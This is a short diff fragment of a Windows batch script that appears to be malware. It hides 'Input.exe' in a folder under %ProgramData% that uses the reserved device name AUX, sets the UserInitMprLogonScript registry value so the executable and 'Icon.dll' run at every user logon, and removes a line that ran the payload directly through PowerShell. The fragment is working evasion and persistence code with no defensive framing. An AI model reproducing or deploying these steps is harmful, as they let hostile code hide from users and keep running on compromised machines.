@@ -26,8 +26,6 @@ move /Y "%ProgramData%\O\Input.exe" "\\.\%ProgramData%\AUX..\"
 
 reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" /f
 
-powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll
-
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
